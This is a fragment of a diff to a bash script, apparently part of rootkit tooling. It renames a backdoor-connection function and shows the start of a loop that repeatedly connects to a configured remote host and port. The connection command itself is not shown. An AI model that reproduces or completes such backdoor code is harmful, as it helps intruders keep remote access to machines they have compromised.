@@ -7,7 +7,7 @@ function set_rootkit_path() {
     fi
 }
 
-function br_connect_backdoor() {
+function connect_backdoor() {
     local target_ip=$remote_host ; local target_port=$remote_port ; local sleep_time=$sleep_time
     while true; do
         MAX_ROW_NUM=$(stty size|cut -d " " -f 1) ; MAX_COL_NUM=$(stty size|cut -d " " -f 2); 
